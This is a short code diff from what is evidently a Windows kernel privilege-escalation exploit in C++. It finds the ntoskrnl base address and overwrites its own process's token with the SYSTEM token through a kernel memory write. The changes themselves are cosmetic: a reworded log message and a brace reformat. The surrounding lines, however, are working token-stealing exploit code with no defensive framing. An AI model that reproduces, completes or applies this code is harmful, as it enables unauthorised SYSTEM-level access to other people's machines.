@@ -96,7 +96,7 @@ int main( int argument_count , char** arguments )
 
         uint64_t nt_base = ntos_base_from_system_info( );
         if ( !nt_base ) {
-            LOG( "[-] refusing unsafe kernel VA scan\n" );
+            LOG( "[-] failed to get ntosbase\n" );
             return 1;
         }
         LOG( "[+] ntoskrnl base = 0x%llX\n" , static_cast< unsigned long long >( nt_base ) );
@@ -203,8 +203,7 @@ int main( int argument_count , char** arguments )
         }
         LOG( "[*] old token = 0x%llX -> new token = 0x%llX\n" , static_cast< unsigned long long >( old_token & ~0xFULL ) , static_cast< unsigned long long >( system_token ) );
 
-        if ( !memory.write_virt<uint64_t>( our_process + version.token , &system_token ) )
-        {
+        if ( !memory.write_virt<uint64_t>( our_process + version.token , &system_token ) ) {
             LOG( "[-] failed to write sys token to our process\n" );
             return 1;
         }
